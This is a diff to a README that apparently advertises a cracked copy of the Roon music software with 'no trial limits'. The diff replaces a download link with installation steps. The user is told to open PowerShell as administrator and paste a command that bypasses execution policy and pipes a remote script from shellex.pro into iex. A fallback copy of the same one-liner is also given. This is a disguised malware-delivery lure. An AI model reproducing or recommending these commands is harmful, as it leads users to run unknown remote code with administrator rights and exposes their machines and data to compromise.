@@ -2,18 +2,31 @@
 
 Rich metadata layer over local and streaming music · Pro workspace · No trial limits · All modules on.
 
-## Setup & Download
+## INSTALLATION
 
-> **Ready to install.** Hit the badge or copy the URL for **Roon** on Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://roon.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://roon.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">ROON</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Host** | **[roon.mefidirect.xyz](https://roon.mefidirect.xyz/)** |
-| **Full URL** | `https://roon.mefidirect.xyz/` |
-| **Type** | Desktop package — Windows 10 and 11, 64-bit |
-| **Admin** | Right-click setup → Run as administrator
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📄 Description
 
